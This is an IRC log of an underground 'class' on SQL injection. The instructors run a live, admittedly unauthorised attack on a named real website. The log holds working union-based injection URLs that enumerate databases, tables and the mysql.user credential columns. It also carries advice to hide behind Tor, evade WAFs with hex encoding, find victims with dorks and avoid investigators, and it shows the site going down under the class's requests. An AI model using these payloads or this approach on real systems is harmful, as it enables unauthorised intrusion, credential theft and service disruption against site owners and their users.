
Class by kr0 ( References at the end )

Anyone did some SQL Injection Manually ? 

< Bahnie_> Haven't used it much
< Braniacs> not really
< Drikizdas> i know some sql
< drzupan> no
<@aediot> omegacolon: that's a no then
< Dewy> I've done a little bit manually :)
< LeEvilBunny> Ive learnt it automatically
< MrClockwork> I know what it is, not really done it before
< webanon> i know a little sql i think
< SharkR00t> I use havij lol
< LeEvilBunny> and i know the different types of SQLi
< Brother> & error based i am too lazy for blind or time based 
<~kr0> Okay
<~kr0> sounds good
<~kr0> so I start at the very basics , I guess
<~kr0> So
<~kr0> We have a Live Demo later on so we can get some fun stuff going as well
<~kr0> lets try it
<~kr0> WHAT IS SQL ?
 * mona raises hand
<~kr0> mona
<&mona> server query language, sir!
<~kr0> well
<~kr0> no
<&mona> or structured
<&mona> :D
<~kr0> yea
<~kr0> good move
<~kr0> Wikipedia says Structered Query Language 
<&mona> i've seen both
<&mona> but i'll believe wikipedia
<~kr0> Its basically a Language used to manage Databases
<~kr0> me too
<~kr0> Its very simple
<~kr0> and maybe we have a class on SQL itself sometime as well
<~kr0> but for now
<~kr0> http://www.w3schools.com/sql/
<~kr0> This can help you
<~kr0> okay
<&mona> understanding sql is definitely a prerequisite of the really difficult-to-exploit sqli
<~kr0> ^
<&mona> you can get by just repeating steps for the simple stuff
<~kr0> exactly
<~kr0> Its basic english
<~kr0> there is SELECT
<~kr0> and DELETE
<~kr0> and Order by 
<~kr0> but for now
<~kr0> I suggest you listen even more if you don't know SQL
<~kr0> Okay, I'll get to the Tools later on
<&mona> obligatory https://xkcd.com/327/
<~kr0> There are different types of SQLi
<~kr0> There is In-Band , Out-of Band and Inferential 
<~kr0> its basically 
<~kr0> You're trying to inject code
<~kr0> Into the Databases Data Flow
<&mona> this is a very specific type of code
<&mona> you're usually trying to inject code for reading to or writing from a database
<~kr0> exactly , its SQL code
<&mona> rather than trying to get a shell
<&mona> (though it is possible)
<&mona> the scope is a bit different from, say
<&mona> PHP injection
<~kr0> In-Band means you get the response on the same channel back
<~kr0> for example 
<~kr0> through http
<~kr0> which is the Classic SQLi
<~kr0> Error Based and Union Based are really common examples
<~kr0> then there is out of band
<~kr0> very uncommon
<~kr0> means you get the response over DNS or even through email
<~kr0> and then there is inferential
<~kr0> Blind SQL Injection for example
<~kr0> Then there is Content based Blind SQLi
<~kr0> and then time based blind sqli
<&mona> example of an out-of-band might be an injection into a query that will cause your SQL to be executed when it's time to send you your password reset email
<&mona> you don't get any output immediately
<&mona> but when you get that email, it has the results of your injection
<&mona> pain in the ass to exploit a lot of the time
<&mona> even more than blind
<~kr0> right
<~kr0> so you got 
<~kr0> Error / Union Based
<~kr0> Out-Of-Band 
<~kr0> and 
<~kr0> Blind
<~kr0> believe me 
<~kr0> You don't want to do the last 2
<~kr0> there are a pain in the ass to exploit
<~kr0> but 
<~kr0> sometimes , you've to do it
<&mona> although when you have an error-based injection you can't make work you will often find blind works as a fallback
<&mona> if you can evaluate expressions, you can almost always do a blind injection
<~kr0> Error based means there is a error on the Website which gives you the data you requested
<~kr0> something like You Have a Error in your MySQL Syntax
<~kr0> bla bla blla
<~kr0> means 
<~kr0> if you ask for the user
<&mona> if you're lucky it'll even display all or part the SQL command that is broken, making it easy to reconstruct the query and figure out what code you need to insert
<~kr0> its like THERE IS NO USER (DB-USER) 

<~kr0> it procecess ur request 
<~kr0> and answers ur question so to say
<&mona> something like "there is an error in your mysql syntax: 'SELECT * FROM USERS WHERE id=1' "
 * kr0 got lag bites 
<~kr0> sry for that
<~kr0> okay
<~kr0> Union is like , you APPLY a query to the excisting Query 
<~kr0> Now it comes to Blind 
<~kr0> Blind is actually very common these days
<~kr0> because Devs just block all the error messages
<~kr0> which means error based is impossible
<~kr0> cuz no errors
<~kr0> they redirect u to a 404 page or something
<~kr0> its like u ask the Database a Question
<~kr0> either with TRUE or FALSE
<~kr0> or with a delay option
<~kr0> like , if your Admin begins with a 'V' (First Character) then wait 20 seconds
<~kr0> and then give me a valid page 
<~kr0> understand , "Blind" u know
<~kr0> okay
<~kr0> since this is the boring beginning 
<~kr0> Are there any questions , yet 
< fsociety> so basically we always need vuln sites like google dorks that get hammered everyday. what about sqli on sites not vulnerable with sql error etc. its not impossible
< Brother> its not boring 
< aemon> no
< omegacolon> hey
< Brother> ya i have questions 
< localhost> no
< omegacolon> there's a video of it where it shows SQLi injection by a hacker who hacked a police department in spain
< AnonRoot> very interesting 
< omegacolon> https://tune.pk/video/6528544/hacking-sindicat-de-mossos-desquadra-catalan-police-union
< omegacolon> 22 minute demo
<~kr0> Okay great
<~kr0> I'll get to that
< omegacolon> k
<~kr0> thanks omegacolon for the transission
<~kr0> Okay
<~kr0> fsociety, 
<~kr0> Google dorks search for these error messages
<&mona> google dorks, especially publicized ones, will get you the low hanging fruit
<~kr0> its a very easy way to exploit websites
<&mona> if it's GHDB most of those sites are pwned already
<&mona> crafting your own dorks will be more likely to get you pristine sites
<&mona> and of course if you have a specific target in mind
<&mona> mostly you need to keep ahead of the wave of skids
<&mona> constantly washing over the Internet
<~kr0> ^
<~kr0> Thats our goal here
<~kr0> Okay
<~kr0> I'll get to the tools now
<~kr0> I guess you all know sqlmap or Havij
<&mona> :<
<~kr0> Those tools are great for what they are 
<~kr0> BUT
<~kr0> BUT
<~kr0> BUT
<~kr0> BUT
<~kr0> They're shit if you want to become a real hacker
<@aediot> ^
<&mona> they're great for hacking sites that perfectly match the limited heuristic for which sqlmap was designed
<~kr0> These tools exploit the weakest possible SQL Vuln
<~kr0> yea
<~kr0> OR
<~kr0> TBH
<~kr0> I don't want to exploit Time based SQL Injections Manually
<~kr0> they are pure cancer
<~kr0> so I use sqlmap TO HELP ME
<~kr0> NOT TO DO THE JOB FOR ME
<@anonymous> "HELP"
<~kr0> There are a thousand things you need to thing of
<&mona> look
<&mona> if you tell yourself
<@anonymous> automated tools cut down on the time, that is all
<&mona> "no i totally get sqli"
<&mona> "i know exactly what's happening"
<&mona> and you hit sqlmap every time
<&mona> and can't do shit when it doesn't work
<&mona> you are a skid
<&mona> it's you
<&mona> that's what you are
<@anonymous> a skid
<&mona> honestly sqlmap is noisy as fuck and has a low success rate
<&mona> i dont even bother with it
<&mona> automated scanners are only good for mass scanning imo
<~kr0> <anonymous> automated tools cut down on the time, that is all
<~kr0> exactly
<~kr0> so
<~kr0> even with sqlmap 
<~kr0> sqlmap only exploits /detects Union and Blind 
<~kr0> Imagine you got a Target
<~kr0> a really really Big Target
<~kr0> and you find a error 
<~kr0> a SQL error
<~kr0> and then you run sqlmap to exploit it
<~kr0> just to get the credentials of the admin
<~kr0> have fun exploiting that 
<~kr0> Drop the DB with SQLMAP
<~kr0> it'll take ages
<~kr0> so
<~kr0> know what you're doing
<~kr0> Its 
<~kr0> > Safer 
<~kr0> > more leet
<~kr0> and the Party Van won't show up
<&butts> (might not show up)
<~kr0> and you got a higher chance owning Big Sites 
<~kr0> :P
<~kr0> Might 
<~kr0> yea 
<~kr0> (take a look at the OpSec Class if you haven't yet)
<~kr0> okay
<~kr0> AND
<~kr0> there are prevention techniques
<~kr0> Wafs , Firewalls, IDS/IPS
<~kr0> and they know the pattern of popular tools
<~kr0> so its really hard avoiding those with scanners
<~kr0> okay
<~kr0> so I guess we got Tools
<@anonymous> the point is to be quiet. scanners project thousands of requests
<~kr0> +1
<~kr0> exactly
<&mona> don't send a "vulnerability assessment framework" to do a hacker's job
<~kr0> and what mister Phineas did in the Video was he IDENTIFIED THE INJECTION with his Brain and then exploited it with sqlmap
<@anonymous> to speed it up
<~kr0> did the because HE KNEW WHAT HE WAS DOING
<@anonymous> ^
<~kr0> okay
<~kr0> any questions 
< ShapeShifter> if dev uses PHP function mysqli_real_escape_string() to filter variables injection is impossible mysqli -> i = improved not injection in this case
<~kr0> we're getting to the fun part
< omegacolon> How do I practice SQLi more effectively?
< SharkR00t> It's a problem if dumped 1k+ account without protections ? (with havij)
< Brother> ya i have some questions 
<@anonymous> lol
< kashloca> so what u r saying first we have to probe for the right sql 
< Brother> what do you mean by response over DNS
< McL0u1s> how we can detect blind?
< Brother> if errors are blocked by DEV anyway to bypass it ? 
< kashloca> and use sqlmap after that 
<~kr0> okay
<@anonymous> heheh
<~kr0> SQL IS A BIG TOPIC
<~kr0> don't be mad if you can cover all questions , but let me say this
<~kr0> omegacolo How do I practice SQLi more effectively?
<~kr0> I'll get to that
<~kr0>SharkR00 It's a problem if dumped 1k+ account without protections ? (with havij)
<~kr0> Yes
<~kr0> very big problem
<~kr0>Brothe what do you mean by response over DNS
<~kr0> you get the response of the Webserver over DNS 
<~kr0> very rare and unusual
<~kr0> McL0u1 how we can detect blind?
<~kr0> well
<~kr0> there are multiple ways
<~kr0> so , you got a parameter which is talking to a DB
<~kr0> like
<&mona> it might be better to wait on that
<&mona> and cover blind after we've gone through how to do error-based
<~kr0> kk
<@aediot> SharkR00t: If you went at a site with havij and didnt channel it through tor or a vpn I would advise you move to another location and pray that there isnt a heavy investigation
<~kr0>Brothe if errors are blocked by DEV anyway to bypass it ?
<~kr0> yes
<&mona> we'll get to the basic "how do I SQLi", guys
<&mona> we're covering the theory
<~kr0> SQLi Blind for example 
<~kr0> kashloca, and I said 
<~kr0> Knew ur shit 
<~kr0> and then decide what you're doing 
<~kr0> don't blindly fire up any Tool
<~kr0> Okay
<~kr0> before we move on to the fun stuff
<~kr0> Basically
<~kr0> what SQL Injection is
<~kr0> doesn't matter what type
<~kr0> You're trying to Inject SQL into the Data stream of the Website 
<~kr0> to grab the data you need
<~kr0> and btw
<~kr0> on of the most common ways to hack a website
<~kr0> cuz
<~kr0> Devs are stupid 
<~kr0> and if they forget to validate the user input correctly , its easy to get vuln
<~kr0> there are ways not to get vuln , but that would be over the top
<~kr0> Okay
<~kr0> any questions before we move on to the hacking ?
< LeEvilBunny> hi
< Brother> if you have to dump a big number of data how to do that ? 
< LeEvilBunny> ?
< webanon> what is the most common way anons get caught
< localhost> Is SQLi like giving a site something that is  can't understand, so it gives evrything out
<~kr0> webanon, ego
< Brother> group_concat have word limits 
< omegacolon> Ever heard of SQLCRYPT (sells for like 300.00) does that deter SQLi?
<@anonymous> Oh dear
< Bahnie> By sql, you mean sql coding, right?
<@anonymous> yes Bahnie
< MagicCookie> do you need to pre-write the SQL code or do you write it on the fly?
< omegacolon> Bahnie: SQL = database command language; SQLi = SQL command injection.
< localhost> will we do manual SQLi
< drzupan> and prepared queries has vulns?
<~kr0> for the Injection MagicCookie ?
< school_time> if I learn this will this help in getting good pussy?
< MagicCookie> yes
< omegacolon> MagicCookie: both, but most of the time it's on-the-fly.
<~kr0> if done correctly drzupan , no
< MagicCookie> ok
<~kr0> yes 
< webanon> shool hahahaha
< p0wontnx> I think only those simple websites uses native SQL Queries to access data, nowadays ORM's are widely used and at least they use prepared statement so that there's no way for SQLi.
<~kr0> exactly
<~kr0> prepared statements
<~kr0> okay
<~kr0> so 
<~kr0> the Fun stuff
<~kr0> We found a Website 
<~kr0> very easy to exploit
<&mona> prepared statements are a good and correct way to avoid sqli
<&mona> that does not mean that sqli is not common
<&mona> and prevalent
<~kr0> Its NOT A TEST WEBSITE 
<~kr0> ITS A REAL WEBSITE 
<@anonymous> oh no..
<~kr0> which means SQLi is not allowed on that 
<~kr0> so 
<&mona> www.mona.com
 * anonymous cant watch
<~kr0> lol
<@anonymous> lol
<&mona> FUCK
<~kr0> so
<~kr0> basically
<@anonymous> i will inject that site all day baby
<&mona> all the feds and whitehats just quit
<~kr0> we are able to exploit SQLi on that Website 
<~kr0> right 
<~kr0> so , Use the tor browser
<~kr0> secure your shit 
<~kr0> soo
<~kr0> we're moving the fun part to a piratenpad
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> Visit this over the Tor Browser
 * kr0 hopes it'll work 
<&mona> rip
<@anonymous> loading...
<~kr0> lol
<~kr0> so 
<&mona> rip pirate party
<~kr0> all good so far ?
< k3y1o> aediot: " If you went at a site with havij and didnt channel it through tor or a vpn I would advise you move to another location and pray that there isnt a heavy investigation" will you show how to chan this through a tunnel?
< school_time> I'm serious do women get wet over this type of thing?
< SR-100> what is the best Sqlmap or Sqlninja ?
< Brother> ok i hope their server will not crash 
<~kr0> school_time, ys
<&mona> ew
<&mona> i can see the pad itself, but it's loading
< MagicCookie> loading
< malefic_> got to allow js 
< localhost> loading
< dev> You all need to enable scripts
<&mona> yeah it just took a while
<&mona> it's loaded
< omegacolon> k
< LeEvilBunny> eh
<~kr0> I'll paste the Important part here as well
< MagicCookie> ok
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> the fun part 
< LeEvilBunny> loaded
<~kr0> I'll go over Important stuff here as well
< DaYs> check
< justme> tnx kr0
< fsociety> i lost a couple minutes cause of dc
< webanon> do i goto https://onionirc.piratenpad.de/SQLi in my tor browser?
< localhost> yes
< Lily> still loading on me
<&mona> lmao
< Scareface>  mine is still loading
<&mona> at monapocalypse
<&butts> you may need to enable scripts for the piratepad to work properly
<~kr0> webanon, yes
< justme> gwt nother route on tor
< greywasp> do i need to enale some scripts or something
< justme> get
< Linux777> still loading too
< Brother> enabling javascript on tor :/ is not a good idea 
< Bahnie> take medium-low security
<&butts> why don't you just paste in here and use the piratepad as reference
< fsociety> up and ready for me
<&mona> i'm just enjoying the entire chatroom of mona
<&mona> it soothes my ego
< MrClockwork> lmao
<~kr0> its easier to get the commands done , butts 
< k3y1o> hah mona
<&mona> there's like 8 of them in there
<~kr0> okay
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
< Lily> butts allow js?
<~kr0> okay
<~kr0> Like I said
<~kr0> I'll put everything Important in here as well
<~kr0> The website is : http://hollandbros.net/store.php?id=4
<&butts> don't touch that site without using tor/tor browser or other proxy
<&mona> that should go without saying
<&mona> but
<&mona> THIS IS AN EXTERNAL SITE
<&mona> you take your life into your own hands
<&butts> even if you are not trying to attack the site. for purpose of this class, DO NOT access it without tor
<&mona> when you leave this ircd
<&mona> always remember that
 * anonymous just watches and smiles
<&mona> inb4 kr0 owns the site and is logging IPs
<~kr0> GET READY
<~kr0> lol
<@anonymous> *disclaimer*
<~kr0> mona if you could copy my stuff here > <3
<~kr0> or anyone
<&mona> all things lie within the currents of causality
<&mona> you see the ?id=4 at the end 
<&mona> It means something like This is the query 
<&mona> SELECT * FROM BEEF where id = 4;
<&mona> ^from the pirate pad
<~kr0> Change the ID to = 5
<~kr0> from 4 to 5
<~kr0> ou should see a difference
<@anonymous> damn, i am starving
<&mona> http://hollandbros.net/store.php?id=6-2
<&mona> use that URL, tell me what you see
<&mona> <chats screams "4" at a fever pitch">
<&mona> exactly
<&mona> so the DB is telling us 6-2 = 4 
<&mona> The DB shouldn't be telling us tho
<&mona> "so how are we able to exploit that"
<&mona> for those wondering why kr0 started with some 6-2 bullshit instead of the traditional fuzz
<&mona> 1) he's trying to demonstrate a concept
<&mona> namely that sql injection is predicated on the database executing your input directly
<@anonymous> ^
<&mona> 2) an uncommon expression can be useful for fuzzing, for example
<&mona> a WAF that blocks 1=1
<&mona> or a common fuzz with the ' character
<&mona> anyway
<&mona> from the piratepad:
<&mona> http://hollandbros.net/store.php?id=4' 
<&mona> you should get this ::
<&mona> 1064: You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near '\'' at line 1
<&mona> http://hollandbros.net/store.php?id=4 or 1=1
<&mona> then try 
<&mona> okay what it does its basically asking for : WHERE ID = 4 or 1=1
<&mona> which is TRUE 
is my connection broken or #school4lulz?
so ist it going on in #school4lulz?
<~kr0> I'll post the log afterwards , so don't worry 
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionir.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> This is the pad we're on
< omegacolon> Etherpad is down.
< smurfer> gg
< Drikizdas> yep
< MrClockwork> rip
< Parabole> yes
< DaYs> gg
<@anonymous> yes it is
< CrazyMotherfucker> :/
< drzupan> down
< nop> You hacking hackers
< omegacolon> Did NSA.. lol
<~kr0> yep okay
< mx661ms> wht hpnd ??
< DaYs> lol
< SR-100> lol
< fsociety> the beef hacked us
< drzupan> lost log :(
< smurfer> rip kr0
< omegacolon> 0x3c62723e = <br>?
< FreeDom> disconnected
<~kr0> okay lets move on here 
< mx661ms> need to login now
< Freenaught008> ?
<~kr0> omegacolon, yes
< greywasp> lost pad?
< drzupan> login what?
< fsociety> yes
< MagicCookie> so what would you type in instead of the 2 to get the columns, and then tables?
< fsociety> beef owned us
< webanon> NSA?
< omegacolon> where did u find that hex info? Or does the browser parse it when putting <br> html format?
<~kr0> we're at this point : http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28table_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6d7973716c%29,3,4,5,6,7,8,9,10,11,12,13,14,15
< MagicCookie> what does it look like un-hexed?
<~kr0> omegacolon, just encode it 
< omegacolon> how?
< drzupan> how to enconde?
<~kr0> there are 2 hex'd strings here 
< kashloca> yeah 
< kashloca> it has 15
<@anonymous> pad is back up
< kashloca> columns
<~kr0> <br> means = new lines
< mx661ms> yeah
< omegacolon> just type in the command normally instead of %20 and etc.. it crosses my eyes.
< MagicCookie> please
< anonmaniac13> LInk for pad ?
<~kr0> okay one sec
< Drikizdas> https://onionirc.piratenpad.de/SQLi?
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
<~kr0> https://onionirc.piratenpad.de/SQLi
< DaYs> hup agin
< Parabole> he is not down
< anonmaniac13> Thanks a bunch
< thr33> whats the link to pad?
< kashloca> rackham
< kashloca> now we have the full sql 
<&rackham> kashloca: 
< mx661ms> https://onionirc.piratenpad.de/SQLi
< kashloca> should we use sqlmap
< kashloca> ?
<&rackham> NO
<&rackham> god damnit
<&rackham> no
< kashloca> okay
<&rackham> hahah
< kashloca> so we should right
< kashloca> r own script
< kashloca> to parse that shit
< k4k3rk> hello
< Freenaught008> (10:57:26 PM) kashloca: should we use sqlmap //LMFAO
<&rackham> kashloca: test it manually
<&mona> lol
<&rackham> kr0 did all of that manually
< kashloca> okay
< thr33> can anyone report the link to all tuts, xerxes....onion?
< kashloca> okay
< k4k3rk> today will have regular class?
<&rackham> thr33: read #main's topic
< thr33> *repost
<&rackham> i dunno how we're goin to do logs on this yet
<@anonymous> what kashloca meant was, after getting this far would you use something like sqlmap to speed it up
< kashloca> yeah that what i meant
< thr33> tnx rack
<@anonymous> for this lesson no, what you do on your own is up to you
<@anonymous> kr0 is trying to make sure  that people understand the manual process of sqli
<@anonymous> if you cant do it manually, you have no usiness running a tool
< kashloca> thanks anonymous
<@anonymous> 0/
< kashloca> but rackham
< kashloca> u didn't explain why u have put the select in the second column of the select
<&rackham> i didn't explain anything in this lesson
< kashloca> yeah i know 
< kashloca> kr0 isn't here
<~kr0> I am
<~kr0> .>
< kashloca> lool
< kashloca> i mean 
< kashloca> okay 
< Parabole> down
< kashloca> why he chose the second parameter to put 1,%28SELECT+GROUP_CONCAT%28table_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6d7973716c%29,3
< kashloca> over the 1
< kashloca> or or 5
< kashloca> anyway thanks
< k4k3rk> people today have class?
< kashloca> people today have an sql orgy
< Parabole> lol
< FreeDom> yes
< FreeDom> https://onionirc.piratenpad.de/SQLi
< Parabole> down
< Drikizdas> again
< Drikizdas> is it down?
< Gonefor> no
< MrClockwork> no
< Parabole> for me
< Parabole> oh no :)
< Parabole> not anymore
 * overfl0w looks around
< MagicCookie> whispers
< MrClockwork> wow, this is really taking it's sweet sweet time to lead :/
< Gonefor> hey
<~kr0> yea , 
<~kr0> okay 
< MagicCookie> use xss reload
<~kr0> ^
< fsociety> kr0 paste link here pls
< nop> I think its my fault the site loads so much
< Jeko_> Pakis
<~kr0> http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28table_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6d7973716c%29,3,4,5,6,7,8,9,10,11,12,13,14,15
< webanon> it says 1222: The used SELECT statements have a different number of columns
< fsociety> thx
< greywasp> same here :/
< ShapeShifter> <?php if (isset($_GET'id')) { $id = (int) $_GET'id'; if ($id < 1) { die(':P'); } }
<~kr0> Okay I guess The site is Down
< Gonefor> let it load
< g0s5> :(((
< webanon> dman did we ddos it
<&rackham> its up
<~kr0> okay , loaded wor me
<~kr0> okay
< MagicCookie> me too
<~kr0> http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28table_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6d7973716c%29,3,4,5,6,7,8,9,10,11,12,13,14,15
<~kr0> http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28table_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6d7973716c%29,3,4,5,6,7,8,9,10,11,12,13,14,15
<~kr0> take a look at that 
< greywasp> im still conceted but fucking slow ...
<&rackham> well you hae 152 people throwing sqli at it...
<&rackham> database is goni to throw up
< Gonefor> hahaha rackham
<~kr0> These are the tables of the DB = mysql
< Freenaught008> lmao this is amazing.
< drzupan> it doesn't load
< Siam4k> :)))
< drzupan> :(
< Gonefor> loading
< greywasp> why putting in hexa ? :)
<~kr0> Databases these days >_>
< greywasp> i still ddind understand :)
< omegacolon> when you insert (SELECT 1....) the parathensis simply means you're running a subquery, no?
< webanon> laright how the hell we suppose to learn if you guys keep hacking it
< g0s5> ok but didnt we want the user database??
< overfl0w> still only loading the databases for me
<~kr0> yea 
<~kr0> okay

OF THE LESSON 
<~kr0> Sry guys 
<~kr0> need to get something done
<~kr0> sry for the lag on the Website 
<~kr0> I guess you get the point of this , I recap
<~kr0> we tried to enumarate the columns 
<~kr0> at the end there were 15 of them
<~kr0> at the current database
<~kr0> then we UNION SELECT all of them and set the id to null
<~kr0> this gave us the Columns which are giving away Info
<~kr0> we used column 2 to inject out queries
<~kr0> our*
<~kr0> we got the databases
<~kr0> information_schema
<~kr0> holland
<~kr0> mysql
<~kr0> phpmyadmin
<~kr0> phpmyadmin_1
<~kr0> This ^
<~kr0> then we used : 
<~kr0> (SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6d7973716c)
<~kr0> to get the tables from the mysql database
<~kr0> we could've done that with every Database tho
<~kr0> but for now: mysql
<~kr0> > mysql
<~kr0> columns_priv
<~kr0> db
<~kr0> event
<~kr0> func
<~kr0> general_log
<~kr0> help_category
<~kr0> help_keyword
<~kr0> help_relation
<~kr0> help_topic
<~kr0> host
<~kr0> ndb_binlog_index
<~kr0> plugin
<~kr0> proc
<~kr0> procs_priv
<~kr0> servers
<~kr0> slow_log
<~kr0> tables_priv
<~kr0> time_zone
<~kr0> time_zone_leap_second
<~kr0> time_zone_name
<~kr0> time_zone_transition
<~kr0> time_zone_traype
<~kr0> user
<~kr0> This is what It gave us 
<~kr0> we choose to pick the 'user' Database to get the credentials of the admin
<~kr0> or even the root 
<~kr0> This is where we at 
<~kr0> any questions on that 


< g0s5> no
< Gonefor> could we have used any other coulmn...other than 2??
<~kr0> yes 
< kashloca> yeah 
< McL0u1s> nope
< webanon> site is 500 internal server error
< greywasp> why using hexa
< greywasp> ?
< omegacolon> that's subquery you just typed in, correct?
< kashloca> we can use 3
< greywasp> i sitll dont understand that ? :)
< kashloca> 5 or 6
< Gonefor> how to check out whether it has 15 columns??
< webanon> seems maybe one of us is not here to learn, butmay already know
< omegacolon> ^^
< Gonefor> site back up again
< omegacolon> ^ ^
< MagicCookie> where do we plug in the Databases/columns to after we hex them?
<~kr0> greywasp, we hex'd <br> and mysql to translate them into "Server Language"
< fsociety> how long will this lesson last?
<~kr0> not long 
<~kr0> already been 3 hrs
< drzupan> but
< g0s5> thx for that!!
< drzupan> if the password
< Drikizdas> 	Host
< Drikizdas> User
< Drikizdas> Password
< Drikizdas> Select_priv
< Drikizdas> Insert_priv
< greywasp> so if we just plaitext then wouldn't work?
< drzupan> is in sha-1
< drzupan> ?
< drzupan> for crack that....
<~kr0> I'll get to that 
< Gonefor> how to check out whether it has 15 columns??
<~kr0> 1 sec
<~kr0> Gonefor, we enumerated with Order by , remember
<~kr0> ?id=4 order by 15
<~kr0> ?id=4 order by 100 
< MagicCookie> so we don't change table name or anything when we add the hex's names?
<~kr0> gave us an error
< Gonefor> yeah
<~kr0> MagicCookie, we just translate the language the server doesn't understand in hex
< omegacolon> Is there a public server where one can practice SQL command language?
< Gonefor> but we randomly guessed 15??
<~kr0> yes
< McL0u1s> the number of the columns is for the query r for all the table?
<~kr0> Gonefor, yea 
<~kr0> we tried 100
<~kr0> then you could go with 50
<~kr0> then with 20
<~kr0> then 10
< Gonefor> then it might take a little bit of timr
< thr33> try a few numbers
< Gonefor> :)
<~kr0> ^ Loads perfectly 
<~kr0> then you got 
<~kr0> ?id=4 order by 11
<~kr0> ?id=4 order by 12
<~kr0> ?id=4 order by 13
<~kr0> ?id=4 order by 14
<~kr0> ?id=4 order by 15
<~kr0> ?id=4 order by 16
<~kr0> ^ gave an error
<~kr0> so we know , its 15
< omegacolon> yup
< Gonefor> ok
< MagicCookie> so the table name like mysql goes at the end? 0x6d7973716c
< Gonefor> any other site to try with??
< MagicCookie> Gonefor, use dorks
< Gonefor> dorks??
< Drikizdas> what are dorks?
< drzupan> dorks?
<~kr0> exactly , + some sites are bloacking such requests thats why you can hex it to bypass it
< omegacolon> ^ ^ 
< overfl0w> <-- not a dork
< thr33> this gal
<~kr0> I'll give you guys a few sites to test
< omegacolon> kr0: thanks for the clarification.
<~kr0> but one sec
<~kr0> one sc
<~kr0> http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28column_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x75736572%29,3,4,version%28%29,database%28%29,7,8,9,10,11,12,13,14,15
<~kr0> http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28column_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x75736572%29,3,4,version%28%29,database%28%29,7,8,9,10,11,12,13,14,15
<~kr0> http://hollandbros.net/store.php?id=null%20UNION%20SELECT%201,%28SELECT+GROUP_CONCAT%28column_name+SEPARATOR+0x3c62723e%29+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x75736572%29,3,4,version%28%29,database%28%29,7,8,9,10,11,12,13,14,15
<~kr0> This is the Input of the table : user 
<~kr0> and I added something 
<~kr0> maybe you notice if you scroll down to price 
< Drikizdas> so, we are in the user db, what now?
< Gonefor> why write it 3 times??
<~kr0> This is the Input from the Database : mysql Table : user
< drzupan> It doesn't load
<~kr0> Give it a minute 
< greywasp> the site is donw
<~kr0> nope , just slow
< greywasp> *down to many requests -.-
<~kr0> reload it 
< fsociety> natural ddos
<~kr0> ^
< aediot> lol
< drzupan> ok
< DaYs> so many doing the same
<~kr0> maybe in the URL you notice a different 
< FreeDom>  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT GROUP_CONCAT column_name SEPARATOR 0x3c62723e FROM INFORMATION_SCHEMA.CO' at line 1
< Gonefor> 500 - Internal Server Error
< omegacolon> 500 = server's down.
< Parabole> rip
<~kr0> Okay 
<~kr0> To speed things up
<~kr0> I injected in this URl
<~kr0> not just our normal request
<~kr0> the Database mysql : Table : user 
<~kr0> I injected In column 5 and 6 as well
<~kr0> take a look at the URL
<~kr0> its like 
<~kr0> Union select 1,mysql.user string,3,4,version().database(),7,8,9,10,11,12,13,14,15
<~kr0> it gives you where the price was at , the version of the MySql server and the current Database in use
<~kr0> did it load ?
< torc> yes
< MagicCookie> no
< torc> Price: holland / 5.1.55
<~kr0> do you see that in the URL
<~kr0> exactly
< omegacolon> kr0 - do you know any publci SQL server we can play around with? So we can practice?
< Freenaught008> price of ? kr0
<~kr0> holland is the current Database
<~kr0> 5.1.55 is the version of the MySQL Server
<~kr0> anyway
<~kr0> lets try to keep that short
< fsociety> omegacolon just set up your sql and practise on your own local server
<~kr0> I'll throw references on sql at you in a Minute 
< omegacolon> Yeah... just need to populate data... like in college lol
< omegacolon> ok
< saimita> 500 - Internal Server Error
< omegacolon> 500 = server's down.
<~kr0> yea
<~kr0> backend error
< drzupan> It's down
<~kr0> anyway
<~kr0> > MySqL (user)
<~kr0> Host
<~kr0> User
<~kr0> Password
<~kr0> Select_priv
<~kr0> Insert_priv
<~kr0> Update_priv
<~kr0> Delete_priv
<~kr0> Create_priv
<~kr0> Drop_priv
<~kr0> Reload_priv
<~kr0> Shutdown_priv
<~kr0> Process_priv
<~kr0> File_priv
<~kr0> Grant_priv
<~kr0> References_priv
<~kr0> Index_priv
<~kr0> Alter_priv
